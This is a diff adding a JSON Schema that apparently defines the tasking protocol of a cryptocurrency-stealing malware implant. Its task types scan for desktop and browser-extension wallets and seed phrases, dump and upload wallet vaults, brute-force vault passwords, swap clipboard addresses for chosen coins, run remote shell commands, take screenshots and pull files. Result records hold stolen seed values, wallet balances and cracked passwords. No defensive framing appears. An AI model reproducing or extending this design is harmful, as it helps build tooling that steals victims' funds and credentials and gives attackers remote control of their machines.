@@ -1,0 +1,120 @@
+{
+  "$id": "spc:tasks:v1",
+  "types": {
+    "scan_wallets": {
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "properties": {
+          "include_desktop": {"type": "boolean", "default": true},
+          "include_extensions": {"type": "boolean", "default": true},
+          "include_seeds": {"type": "boolean", "default": true},
+          "max_files": {"type": "integer", "minimum": 1, "maximum": 20000, "default": 4000}
+        }
+      },
+      "result": {
+        "type": "object",
+        "required": ["wallets", "seeds", "elapsed_ms"],
+        "properties": {
+          "wallets": {"type": "array", "items": {"$ref": "#/$defs/wallet"}},
+          "seeds": {"type": "array", "items": {"$ref": "#/$defs/seed"}},
+          "elapsed_ms": {"type": "integer"},
+          "truncated": {"type": "boolean"}
+        }
+      }
+    },
+    "dump_vault": {
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": ["target"],
+        "properties": {
+          "target": {"type": "string", "pattern": "^[a-z0-9_.-]{1,64}$"},
+          "profile": {"type": "string", "enum": ["lite", "full"]}
+        }
+      },
+      "result": {
+        "type": "object",
+        "required": ["target", "artifacts", "upload_id"],
+        "properties": {
+          "target": {"type": "string"},
+          "artifacts": {"type": "integer"},
+          "bytes": {"type": "integer"},
+          "upload_id": {"type": "string", "format": "uuid"},
+          "status": {"type": "string", "enum": ["queued", "uploaded", "partial"]}
+        }
+      }
+    },
+    "crack_vault": {
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "required": ["target"],
+        "properties": {
+          "target": {"type": "string"},
+          "max_seconds": {"type": "integer", "minimum": 5, "maximum": 600, "default": 90},
+          "max_cpu_pct": {"type": "integer", "minimum": 10, "maximum": 100, "default": 50},
+          "wordlist": {"type": "string", "maxLength": 4096, "default": ""}
+        }
+      },
+      "result": {
+        "type": "object",
+        "required": ["target", "found", "attempts"],
+        "properties": {
+          "target": {"type": "string"},
+          "found": {"type": "boolean"},
+          "password": {"type": ["string", "null"]},
+          "attempts": {"type": "integer"},
+          "elapsed_ms": {"type": "integer"}
+        }
+      }
+    },
+    "clip_start": {
+      "params": {
+        "type": "object",
+        "additionalProperties": false,
+        "properties": {
+          "replace": {"type": "boolean", "default": false},
+          "coins": {"type": "object", "additionalProperties": {"type": "array", "items": {"type": "string"}}},
+          "max_history": {"type": "integer", "minimum": 16, "maximum": 5000, "default": 500}
+        }
+      },
+      "result": {"$ref": "#/$defs/ok"}
+    },
+    "clip_stop": {"params": {"type": "object", "additionalProperties": false}, "result": {"$ref": "#/$defs/ok"}},
+    "shell": {
+      "params": {"type": "object", "required": ["command"], "properties": {"command": {"type": "string", "maxLength": 8192}, "timeout_sec": {"type": "integer", "minimum": 1, "maximum": 120, "default": 60}}},
+      "result": {"type": "object", "properties": {"exit": {"type": "integer"}, "output": {"type": "string"}}}
+    },
+    "harvest": {"params": {"type": "object", "additionalProperties": false}, "result": {"$ref": "#/$defs/ok"}},
+    "screenshot": {"params": {"type": "object", "additionalProperties": false}, "result": {"$ref": "#/$defs/artifact"}},
+    "file_pull": {
+      "params": {"type": "object", "required": ["path"], "properties": {"path": {"type": "string", "maxLength": 4096}, "max_mb": {"type": "integer", "minimum": 1, "maximum": 256, "default": 64}}},
+      "result": {"$ref": "#/$defs/artifact"}
+    },
+    "cancel": {"params": {"type": "object", "required": ["task_id"], "properties": {"task_id": {"type": "string", "format": "uuid"}}}, "result": {"$ref": "#/$defs/ok"}}
+  },
+  "$defs": {
+    "wallet": {
+      "type": "object",
+      "required": ["id", "kind", "path", "state"],
+      "properties": {
+        "id": {"type": "string"},
+        "kind": {"type": "string", "enum": ["extension", "desktop", "keystore", "core", "seed_file", "creds"]},
+        "path": {"type": "string"},
+        "state": {"type": "string", "enum": ["found", "decrypted", "locked", "unsupported", "corrupt"]},
+        "reason": {"type": "string"},
+        "address": {"type": "string"},
+        "balance": {"type": "string"},
+        "crackable": {"type": "boolean"}
+      }
+    },
+    "seed": {
+      "type": "object",
+      "required": ["path", "kind", "value"],
+      "properties": {"path": {"type": "string"}, "kind": {"type": "string", "enum": ["bip39", "hex", "wif", "base58", "keystore_json"]}, "value": {"type": "string"}, "words": {"type": "integer"}}
+    },
+    "ok": {"type": "object", "properties": {"ok": {"type": "boolean"}}},
+    "artifact": {"type": "object", "required": ["upload_id"], "properties": {"upload_id": {"type": "string", "format": "uuid"}, "bytes": {"type": "integer"}}}
+  }
+}
